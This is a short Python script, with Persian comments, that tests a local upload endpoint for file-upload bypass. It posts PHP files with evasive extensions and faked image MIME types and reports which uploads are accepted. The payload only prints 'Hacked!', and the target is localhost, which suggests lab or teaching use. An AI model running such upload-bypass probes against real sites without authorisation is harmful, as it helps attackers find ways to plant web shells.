import requests

def test_upload(url):
    print(f"[*] Testing file upload on {url}")
    
    # فایل‌های مخربی که هکرها تست می‌کنن
    payloads = [
        ("shell.php", "<?php echo 'Hacked!'; ?>", "application/x-php"),
        ("shell.php5", "<?php echo 'Hacked!'; ?>", "application/x-php"),
        ("shell.phtml", "<?php echo 'Hacked!'; ?>", "application/x-php"),
        ("shell.jpg.php", "<?php echo 'Hacked!'; ?>", "image/jpeg"),
        ("shell.php.jpg", "<?php echo 'Hacked!'; ?>", "image/jpeg")
    ]
    
    for filename, content, mime_type in payloads:
        # ساخت فایل جعلی برای آپلود
        files = {'file': (filename, content, mime_type)}
        
        try:
            r = requests.post(url, files=files, timeout=3)
            
            if r.status_code == 200:
                print(f"[+] Upload succeeded: {filename}")
                
                # چک کردن آدرس اجرای فایل (اگه سرور اجرا کنه)
                # (در سناریوی واقعی، هکر آدرس فایل رو باز می‌کنه)
                print(f"    [!] Check if {filename} is executable on server!")
            else:
                print(f"[-] Blocked: {filename} (Status: {r.status_code})")
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    target_url = "http://127.0.0.1:8000/upload"
    test_upload(target_url)
